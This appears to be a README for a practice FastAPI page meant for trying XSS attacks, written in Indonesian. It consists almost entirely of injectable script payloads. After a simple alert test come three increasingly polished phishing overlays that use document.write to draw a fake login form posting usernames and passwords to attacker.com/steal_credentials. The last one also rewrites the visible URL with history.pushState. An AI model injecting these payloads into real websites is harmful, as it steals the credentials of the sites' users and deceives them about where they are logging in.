# Dumy page Xss Attack

Web FastAPI untuk mencoba attack XSS

## Simple Allert

```sh {"id":"01HZEQX3N8TFEW2VHXTQF7VH6Y"}
<script>alert('XSS Attack!');</script>
```

## Form Fishing

```sh {"id":"01HZEQR82760CB27HTG59A734C"}
<script>
document.write('<div style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); padding:20px; background-color:white; border:2px solid black; z-index:1000;">' +
    '<h2>Login</h2>' +
    '<form method="POST" action="http://attacker.com/steal_credentials">' +
    '<label for="username">Username:</label>' +
    '<input type="text" id="username" name="username"><br><br>' +
    '<label for="password">Password:</label>' +
    '<input type="password" id="password" name="password"><br><br>' +
    '<button type="submit">Login</button>' +
    '</form>' +
    '</div>');
</script>
```

## Styled Fishing Form

```sh {"id":"01HZER37GW7GA5FB5G7JPFMTSN"}
<script>
document.write('<div style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); padding:20px; background-color:#f9f9f9; border:2px solid #ccc; border-radius:10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); z-index:1000; width:300px; text-align:center;">' +
    '<h2 style="margin-bottom:20px;">Login</h2>' +
    '<form method="POST" action="http://attacker.com/steal_credentials">' +
    '<label for="username" style="display:block; margin-bottom:8px;">Username:</label>' +
    '<input type="text" id="username" name="username" style="width:90%; padding:10px; margin-bottom:20px; border:1px solid #ccc; border-radius:5px;"><br>' +
    '<label for="password" style="display:block; margin-bottom:8px;">Password:</label>' +
    '<input type="password" id="password" name="password" style="width:90%; padding:10px; margin-bottom:20px; border:1px solid #ccc; border-radius:5px;"><br>' +
    '<button type="submit" style="padding:10px 20px; border:none; border-radius:5px; background-color:#5cb85c; color:white; cursor:pointer;">Login</button>' +
    '</form>' +
    '</div>');
</script>

```

## Finale Fishing Form

```sh {"id":"01HZEWJ784P7B4KB63NQFDCQS0"}
<script>
(function() {
    history.pushState({}, "", "/xss_attack_form");
    document.write(`
        <html>
        <head>
            <title>Login</title>
            <style>
                .login-container {
                    position: fixed;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    padding: 20px;
                    background-color: #f9f9f9;
                    border: 2px solid #ccc;
                    border-radius: 10px;
                    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
                    z-index: 1000;
                    width: 300px;
                    text-align: center;
                }
                .login-container h2 {
                    margin-bottom: 20px;
                }
                .login-container label {
                    display: block;
                    margin-bottom: 8px;
                }
                .login-container input {
                    width: 90%;
                    padding: 10px;
                    margin-bottom: 20px;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                }
                .login-container button {
                    padding: 10px 20px;
                    border: none;
                    border-radius: 5px;
                    background-color: #5cb85c;
                    color: white;
                    cursor: pointer;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h2>Login</h2>
                <form method="POST" action="http://attacker.com/steal_credentials">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password">
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
    `);
})();
</script>

```